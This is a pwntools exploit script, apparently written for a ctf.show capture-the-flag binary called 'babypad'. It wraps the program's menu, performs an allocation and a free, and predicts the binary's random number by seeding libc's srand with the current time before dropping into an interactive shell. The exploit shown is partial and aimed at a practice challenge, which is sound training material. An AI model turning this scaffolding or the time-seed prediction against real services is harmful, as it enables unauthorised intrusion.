from ctypes import cdll
from pwn import *
import sys
remote_addr = ["pwn.challenge.ctf.show",28108]
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./babypad")
    context(arch='i386', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def add1(size, content):
    sla(b'(CMD)>>> ', b'a')
    sla(b'(SIZE)>>> ', str(size))
    sla(b'(CONTENT)>>> ', content)

def edit1(index, content):
    sla(b'(CMD)>>> ', b'e')
    sla(b'(INDEX)>>> ', str(index))
    sla(b'(CONTENT)>>> ', content)
    sla(b'(Y/n)>>> ', b'Y')

def delete1(index):
    sla(b'(CMD)>>> ', b'D')
    sla(b'(INDEX)>>> ', str(index))


debug('''
    b *0x401238
    b *0x400bad
''')

add1(1, b'1')
delete1(1)

s(b'6')
pause()
s(b'3')
pause()
sl(b'1')
libc.srand(libc.time(0))
a = str(libc.rand() % 10000 + 1).encode()
sl(a)


shell()
